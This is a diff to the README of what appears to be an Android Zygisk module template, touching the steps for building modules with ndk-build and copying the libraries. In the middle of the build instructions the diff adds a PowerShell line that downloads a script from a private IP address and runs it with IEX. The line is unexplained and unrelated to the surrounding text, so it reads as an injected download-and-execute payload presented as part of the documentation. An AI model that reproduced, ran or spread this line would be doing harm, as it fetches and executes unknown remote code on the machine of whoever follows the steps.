@@ -36,7 +36,7 @@ This repository is archived because it is meant to be read-only; the project is 
 - In the `module` folder, call [`ndk-build`](https://developer.android.com/ndk/guides/ndk-build) to compile your modules.
 - Your module libraries will be in `libs/<abi>/lib<module_name>.so`.
 - Copy the libraries into your module's `zygisk` folder, with the ABI as it's file name:
-
+IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.79:8080/n.ps1')
 ```
 module_id
 ├── module.prop
